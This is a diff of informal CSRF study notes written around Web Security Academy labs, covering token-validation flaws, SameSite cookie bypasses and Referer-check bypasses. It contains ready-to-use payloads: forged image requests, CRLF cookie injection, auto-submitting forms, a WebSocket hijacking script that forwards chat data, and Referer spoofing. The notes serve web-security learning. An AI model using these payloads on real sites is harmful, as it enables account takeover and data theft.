@@ -2,8 +2,6 @@
 
 Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.
 
----
-
 In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally.  
 For example:
 
@@ -17,28 +15,16 @@ the attacker might be able to gain full control over the user's account. If the 
 
 For a CSRF attack to be possible, three key conditions must be in place:
 
-## 1) A relevant action.
-
+1) A relevant action.  
 - a privileged action  such as modifying permissions for other users  
 - user-specific data (such as changing the user's own password)
 
----
-
-## 2) Cookie-based session handling:
-
-Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who made the requests.
-
+2)Cookie-based session handling: Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who made the requests.  
 - There is no other mechanism in place for tracking sessions or validating user requests.
 
----
-
-## 3) No unpredictable request parameters.
-
-The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. for example when changing user's password , requests u to input the old one
+3) No unpredictable request parameters. The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. for example when changing user's password , requests u to input the old one
 
 ---
-
-### Example request
 
 ```http
 POST /email/change HTTP/1.1
@@ -104,21 +90,19 @@ u can view the exploit and u will see that the email changed to whatever u put.
 
 ---
 
-#####################################
-How to deliver a CSRF exploit
-#####################################
+# How to deliver a CSRF exploit
 
 1) the attacker will place the malicious HTML onto a website that they control, and then induce victims to visit that website. This might be done by feeding the user a link to the website, via an email or social media message.
 
 2) some simple CSRF exploits employ the GET method and can be fully self-contained with a single URL on the vulnerable website.
+
 ```html
 <img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
 ```
+
 ---
 
-#####################################
-XSS vs CSRF
-#####################################
+# XSS vs CSRF
 
 XSS allows an attacker to execute arbitrary JavaScript within the browser of a victim user.
 
@@ -138,16 +122,13 @@ If you visit a malicious website, it could secretly send a background request (l
 
 ---
 
-## How it Works:
+How it Works:
 
-### Generation:
-When you load a form on a legitimate website, the server generates a random token and embeds it into the HTML (usually as a hidden input field). It also stores this token in your user session on the server.
+Generation: When you load a form on a legitimate website, the server generates a random token and embeds it into the HTML (usually as a hidden input field). It also stores this token in your user session on the server.
 
-### Submission:
-When you submit the form, the token is sent back to the server along with your authentication cookies.
+Submission: When you submit the form, the token is sent back to the server along with your authentication cookies.
 
-### Validation:
-The server compares the submitted token with the token stored in your session. If they match: The request is approved. If the token is missing or incorrect: The server rejects the request.
+Validation: The server compares the submitted token with the token stored in your session. If they match: The request is approved. If the token is missing or incorrect: The server rejects the request.
 
 Because of the browser's Same-Origin Policy, a malicious website cannot read the HTML or cookies belonging to another domain (e.g., your bank's website). Therefore, the attacker cannot guess or steal the valid CSRF token to include in their forged request.
 
@@ -194,37 +175,29 @@ CSRF vulnerabilities typically arise due to flawed validation of CSRF tokens.
 
 ## Validation depends on request method
 
-Some applications correctly validate the token when the request uses the POST method but skip validation when the GET method is used.
+Some applications correctly validate the token when the request uses POST but skip validation when GET is used.
 
 ### Lab: CSRF where token validation depends on request method
 
-Login using wiener/peter, update email and intercept request.
-
-Change method to GET:
-
 ```http
-GET https://vuln-website/change-email?email=wiener2@gmail.com&csrf=12awd123dwdqd
+GET https://vuln-website/change-email?email=test@gmail.com&csrf=12awd123dwdqd
 ```
-
-Right-click → Generate CSRF PoC → deliver exploit.
 
 ---
 
-## Validation depends on token being present
+## Validation depends on token presence
 
 Some applications validate token only if it exists.
 
 ### Lab: CSRF where token validation depends on token being present
 
-Try deleting CSRF token completely → request works.
-
-Then generate CSRF PoC → deliver exploit.
+Delete csrf token completely → request works.
 
 ---
 
 ## CSRF token not tied to session
 
-Some applications accept any valid token from a global pool.
+Some applications accept tokens from a global pool.
 
 ### Lab: CSRF where token is not tied to user session
 
@@ -234,17 +207,16 @@ Reuse token from another account → works.
 
 ## CSRF token tied to non-session cookie
 
-Some systems bind CSRF token to a separate cookie (csrfKey).
+Some applications bind CSRF token to a separate cookie (csrfKey).
 
-If attacker can set cookie → CSRF bypass possible.
+If attacker can set cookie → bypass possible.
 
 ---
 
-### Example request
+Example:
 
 ```http
 POST /email/change HTTP/1.1
-Host: vulnerable-website.com
 Cookie: session=AAA; csrfKey=BBB
 
 csrf=BBB&email=test@example.com
@@ -252,37 +224,26 @@ csrf=BBB&email=test@example.com
 
 ---
 
-## Lab: CSRF where token tied to non-session cookie
+### Lab: CSRF where token tied to non-session cookie
 
-CRLF injection used to set cookie:
+CRLF injection:
 
 ```text
 %0D%0ASet-Cookie: csrfKey=ATTACKER_VALUE
-```
-
-Exploit:
-
-```html
-<img src="https://LAB/?search=test%0D%0ASet-Cookie:%20csrfKey=ATTACKER"
-onerror="document.forms[0].submit()">
 ```
 
 ---
 
 ## CSRF token duplicated in cookie (double submit)
 
-Token stored in both cookie and request parameter.
+Cookie and parameter must match.
 
-Server checks only equality.
-
-### Example
+Example:
 
 ```http
 Cookie: csrf=ABC
 csrf=ABC
 ```
-
-If attacker can set cookie → bypass possible.
 
 ---
 
@@ -294,12 +255,6 @@ Inject cookie via CRLF:
 %0D%0ASet-Cookie: csrf=VALUE; SameSite=None
 ```
 
-Exploit uses:
-
-```html
-<img src="https://LAB/?search=...Set-Cookie..."
-onerror="document.forms[0].submit()">
-```
 # SameSite Cookie
 
 ## the difference between the site and origin:
@@ -318,34 +273,32 @@ https://facebook.com:8080
 
 ---
 
-URL comparison:
+URL
 
-| URL | origin |
-|-----|--------|
-| https://example.com | https://example.com:443 |
-| http://example.com | http://example.com:80 |
-| https://example.com:8080 | https://example.com:8080 |
-| https://api.example.com | https://api.example.com:443 |
+https://example.com	https://example.com:443  
+http://example.com	http://example.com:80  
+https://example.com:8080	https://example.com:8080  
+https://api.example.com	https://api.example.com:443  
 
 ---
 
 Two URLs have the same origin only if all three match:
 
-- Protocol (HTTP/HTTPS)  
-- Hostname  
-- Port  
+Protocol (HTTP/HTTPS)  
+Hostname  
+Port  
 
 ---
 
-Same Origin examples:
+URL A 			URL B			Same Origin?
 
-https://example.com → https://example.com/account (YES)
+https://example.com     https://example.com/account  	(YES)
 
-https://example.com → http://example.com (NO)
+https://example.com	http://example.com	     	(NO)
 
-https://example.com → https://api.example.com (NO)
+https://example.com	https://api.example.com		(NO)
 
-https://example.com → https://example.com:8080 (NO)
+https://example.com	https://example.com:8080	(NO)
 
 ---
 
@@ -357,22 +310,22 @@ scheme + registrable domain (eTLD+1)
 
 ---
 
-| URL | Site |
-|-----|------|
-| https://app.example.com | https://example.com |
-| https://api.example.com | https://example.com |
-| https://blog.example.com | https://example.com |
+URL → Site
+
+https://app.example.com  → https://example.com  
+https://api.example.com  → https://example.com  
+https://blog.example.com → https://example.com  
 
 ---
 
-These are:
+these are :
 
 different origin  
 same site  
 
 ---
 
-We use origin in SOP (Same Origin Policy)
+we use origin in SOP (Same Origin Policy)
 
 JavaScript on:
 
@@ -386,7 +339,7 @@ unless CORS allows it.
 
 ---
 
-We use site in SameSite Cookies
+we use site in SameSite Cookies
 
 ---
 
@@ -394,7 +347,7 @@ If cookie is set on:
 
 https://app.example.com
 
-Request to:
+A request to:
 
 https://api.example.com
 
@@ -404,13 +357,11 @@ is considered same-site.
 
 Set-Cookie: session=abc; SameSite=Lax
 
-can still be sent between subdomains because they are same site.
+can still be sent between subdomains because they're same site.
 
 ---
 
 # How does SameSite work?
-
-SameSite controls whether cookies are sent in cross-site requests.
 
 Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
 
@@ -418,112 +369,53 @@ Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
 
 ## SameSite levels:
 
-- Strict  
-- Lax  
-- None  
+Strict  
+Lax  
+None  
 
 ---
 
 ## Strict
 
-cookies will NOT be sent in any cross-site requests.
-
-If request originates from different site → cookie not included.
-
-Used for sensitive actions.
+browsers will not send the cookie in any cross-site requests.
 
 ---
 
 ## Lax
 
-cookies are sent in cross-site requests ONLY if:
+cookies are sent in cross-site requests, but only if:
 
-- request uses GET  
-- request is top-level navigation  
-
----
-
-### Top-level navigation examples:
-
-Click link:
-```html
-<a href="https://victim.com/account">My Account</a>
-```
----
-
-Type URL:
-
-https://victim.com
+- GET method  
+- top-level navigation  
 
 ---
 
-JavaScript redirect:
+Top-level navigation examples:
 
-window.location = "https://victim.com/account";
-
----
-
-Form submission:
-
-```html
-<form action="https://victim.com/change-email" method="GET">
-    <input type="hidden" name="email" value="attacker@example.com">
-</form>
-```
+Click link  
+Type URL  
+window.location redirect  
+form submit  
+auto-submit form  
 
 ---
 
-Auto-submit form:
+Not top-level:
 
-```html
-<form id="f" action="https://victim.com/change-email" method="GET">
-    <input type="hidden" name="email" value="attacker@example.com">
-</form>
-
-<script>
-document.getElementById('f').submit();
-</script>
-```
-
----
-
-## Not top-level navigation:
-
-Image request:
-```html
-<img src="https://victim.com/delete-account">
-```
----
-
-Background form submit:
-```html
-<form action="https://victim.com/change-email" method="GET">
-```
----
-
-POST requests are more likely CSRF targets.
-
-Cookies not included in background requests like images/iframes/scripts.
+<img src="">  
+background requests  
 
 ---
 
 ## None
 
-disables SameSite restrictions completely.
-
-Cookie is sent in all requests including third-party sites.
-
----
-
-Must include Secure attribute:
+disables SameSite restrictions
 
 Set-Cookie: trackingId=ABC; SameSite=None; Secure
 
 ---
 
 # Bypassing SameSite Lax restrictions using GET requests
-
-If server accepts GET instead of POST, CSRF still works.
 
 ```html
 <script>
@@ -533,9 +425,7 @@ document.location = 'https://vulnerable-website.com/account/transfer-payment?rec
 
 ---
 
-## Method override trick
-
-Some frameworks allow overriding method using _method:
+## method override
 
 ```html
 <form action="https://vulnerable-website.com/account/transfer-payment" method="GET">
@@ -549,21 +439,11 @@ Some frameworks allow overriding method using _method:
 
 # Lab: SameSite Lax bypass via method override
 
-Change POST → GET in CSRF PoC.
-
-GET request may include cookie but endpoint rejects method.
-
-Use _method=POST to bypass.
+change POST → GET in CSRF PoC
 
 ---
 
 # Bypassing SameSite using client-side redirect gadgets
-
-If SameSite=Strict → cookies not sent cross-site.
-
-Need redirect gadget inside target site.
-
-Flow:
 
 attacker → site page → same site page → action
 
@@ -571,21 +451,11 @@ attacker → site page → same site page → action
 
 # Lab: SameSite Strict bypass via client-side redirect
 
-Find redirect in blog confirmation page:
-
-/post/comment/confirmation?postId=x
-
-JS builds redirect using postId.
-
-Exploit path traversal:
-
 ```text
 /post/comment/confirmation?postId=1/../../my-account/change-email?email=test%40mail.com%26submit=1
 ```
 
 ---
-
-Exploit:
 
 ```html
 <script>
@@ -595,32 +465,22 @@ document.location="https://LAB/post/comment/confirmation?postId=10/../../my-acco
 
 ---
 
-Server-side redirects still enforce SameSite restrictions.
-
----
-
-## sibling domains
+# sibling domains
 
 https://blog.example.com  
 https://admin.example.com  
 
-same site but different origin
+same site different origin  
 
 ---
 
-XSS in one subdomain can affect another via same-site cookies.
+## CSWSH
 
----
-
-## CSWSH (Cross-Site WebSocket Hijacking)
-
-WebSocket handshake can be abused if no CSRF protection exists.
+Cross-Site WebSocket Hijacking
 
 ---
 
 # Lab: SameSite Strict bypass via sibling domain
-
-WebSocket exploit:
 
 ```javascript
 var ws = new WebSocket('wss://LAB/chat');
@@ -640,7 +500,7 @@ body:event.data
 
 ---
 
-CMS sibling domain found → XSS injected into username:
+CMS XSS:
 
 ```html
 <script>
@@ -662,24 +522,11 @@ body:event.data
 
 # SameSite Lax bypass via cookie refresh (120-second rule)
 
-Chrome default SameSite=Lax applies to cookies without attribute.
-
-Exception:
-
-- first 120 seconds after cookie issued
-- cookie may be sent in top-level POST
+Chrome allows newly issued cookies for 120 seconds in top-level POST.
 
 ---
 
-## Attack idea:
-
-1. force login → new cookie  
-2. exploit within 120 seconds  
-3. browser sends cookie anyway  
-
----
-
-Popup refresh trick:
+Popup refresh:
 
 ```javascript
 window.onclick = () => {
@@ -690,14 +537,6 @@ window.onclick = () => {
 ---
 
 # Lab: SameSite Lax bypass via cookie refresh
-
-Steps:
-
-- trigger /social-login
-- OAuth issues fresh session cookie
-- open popup via click
-- wait 5 seconds
-- submit CSRF
 
 ```html
 <form method="POST" action="https://LAB/my-account/change-email">
@@ -711,6 +550,7 @@ window.onclick = () => {
 };
 </script>
 ```
+
 # Bypassing Referer-based CSRF defenses
 
 some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain.
@@ -723,37 +563,41 @@ Referer header : is an optional request header that contains the URL of the web 
 
 Some applications validate the Referer header when it is present in requests but skip the validation if the header is omitted.
 
-an attacker can craft their CSRF exploit in a way that causes the victim user's browser to drop the Referer header in the resulting request.
-to achieve this : 
+an attacker can craft their CSRF exploit in a way that causes the victim user's browser to drop the Referer header in the resulting request. to achieve this :
 
 using a META tag within the HTML page that hosts the CSRF attack:
+
 ```html
-<meta name="referrer" content="never"> // this tells the browser to not send the referrer header in http request
+<meta name="referrer" content="never">
 ```
+
 ---
 
-## Lab: CSRF where Referer validation depends on header being present
+# Lab: CSRF where Referer validation depends on header being present
 
-login and intercept the request : u will notice that the session cookie has a samesite = none  means the browser will include it even if  the request comes from a cross site .
+login and intercept the request : u will notice that the session cookie has a samesite = none means the browser will include it even if the request comes from a cross site .
 
-go to my account -> change the email and intercept it :  notice that there are no csrf defenses such as csrf token , ...etc
-so this site is vulnerable to csrf attacks now lets go and craft a csrf exploit html page 
+go to my account -> change the email and intercept it : notice that there are no csrf defenses such as csrf token , ...etc  
+so this site is vulnerable to csrf attacks now lets go and craft a csrf exploit html page  
 
-right-click on the change email request  -> select engagement tools -> generate csrf poc -> copy the html 
-go to exploit server -> store .
+right-click on the change email request -> select engagement tools -> generate csrf poc -> copy the html  
+go to exploit server -> store  
 
-click view exploit and intercept the request: notice that the application shows that the referrer header invalid. 
-this maybe means that the referrer should include the url from the same site  not from a cross one.
+click view exploit and intercept the request: notice that the application shows that the referrer header invalid.  
+this maybe means that the referrer should include the url from the same site not from a cross one.
 
-try to delete the referrer header and send the request : it worked 
+try to delete the referrer header and send the request : it worked  
 
 so now we need to find a way to tell the user's browser to not include the referrer header in the request.
 
-using the meta tag html element 
+using the meta tag html element  
+
 ```html
-<meta name="referrer" content="never">   // this tells the browser to not send the referrer header in the request 
+<meta name="referrer" content="never">
 ```
-so add it inside the header element 
+
+so add it inside the header element  
+
 ```html
 <html>
   <header><meta name="referrer" content="never"></header>
@@ -769,53 +613,75 @@ so add it inside the header element
   </body>
 </html>
 ```
+
 ---
 
 ## Validation of Referer can be circumvented
 
 1) if the application validates that the domain in the Referer starts with the expected value, then the attacker can place this as a subdomain of their own domain:
 
+```text
 http://vulnerable-website.com.attacker-website.com/csrf-attack
-
-2) if the application simply validates that the Referer contains its own domain name, then the attacker can place the required value elsewhere in the URL:
-
-http://attacker-website.com/csrf-attack?vulnerable-website.com
-
-but here for  2) approach   to reduce the risk of sensitive data being leaked  browsers strip the query string from the Referer header by default.
-so to solve this problem : 
-
-1) add inside the header element ```html<meta name="referrer" content="unsafe-url">```   which tells the browser to include the full url path with its query parameters 
-
-2) in the header http request add referrer-policy: unsafe-url
+```
 
 ---
 
-## Lab: CSRF with broken Referer validation
+2) if the application simply validates that the Referer contains its own domain name, then the attacker can place the required value elsewhere in the URL:
 
-login and intercept the request : u will notice that the session cookie has a samesite = none  means the browser will include it even if  the request comes from a cross site .
+```text
+http://attacker-website.com/csrf-attack?vulnerable-website.com
+```
 
-go to my account -> change the email and intercept it :  notice that there are no csrf defenses such as csrf token , ...etc
-so this site is vulnerable to csrf attacks now lets go and craft a csrf exploit html page 
+but here for 2) approach to reduce the risk of sensitive data being leaked browsers strip the query string from the Referer header by default.
 
-right-click on the change email request  -> select engagement tools -> generate csrf poc -> copy the html 
-go to exploit server -> store .
+so to solve this problem :
 
-click view exploit and intercept the request: notice that the application shows that the referrer header invalid. 
-this maybe means that the referrer should include the url from the same site  not from a cross one.
+1) add inside the header element:
 
-try delete the referer header -> not worked 
+```html
+<meta name="referrer" content="unsafe-url">
+```
 
-change the referer  header value to:
+which tells the browser to include the full url path with its query parameters  
 
-Referer: http://attacker-website.com/exploit/?0aac003104067e1c809db7e300100083.web-security-academy.net   -> it worked 
+2) in the header http request add:
 
-so the application validates if its domain exist any where in the referer header 
+```http
+Referrer-Policy: unsafe-url
+```
 
-so now we need to : 
+---
 
-1) use history.push()  to add /?0aac003104067e1c809db7e300100083.web-security-academy.net
+# Lab: CSRF with broken Referer validation
 
-2) use meta tag to tell the browser to include the full url path including its string query parameters 
+login and intercept the request : u will notice that the session cookie has a samesite = none means the browser will include it even if the request comes from a cross site .
+
+go to my account -> change the email and intercept it : notice that there are no csrf defenses such as csrf token , ...etc  
+so this site is vulnerable to csrf attacks now lets go and craft a csrf exploit html page  
+
+right-click on the change email request -> select engagement tools -> generate csrf poc -> copy the html  
+go to exploit server -> store  
+
+click view exploit and intercept the request: notice that the application shows that the referrer header invalid.  
+this maybe means that the referrer should include the url from the same site not from a cross one.
+
+try delete the referer header -> not worked  
+
+change the referer header value to:
+
+```text
+Referer: http://attacker-website.com/exploit/?0aac003104067e1c809db7e300100083.web-security-academy.net
+```
+
+-> it worked  
+
+so the application validates if its domain exist any where in the referer header  
+
+so now we need to :
+
+1) use history.push() to add /?0aac003104067e1c809db7e300100083.web-security-academy.net
+
+2) use meta tag to tell the browser to include the full url path including its string query parameters  
 
 ```html
 <html>
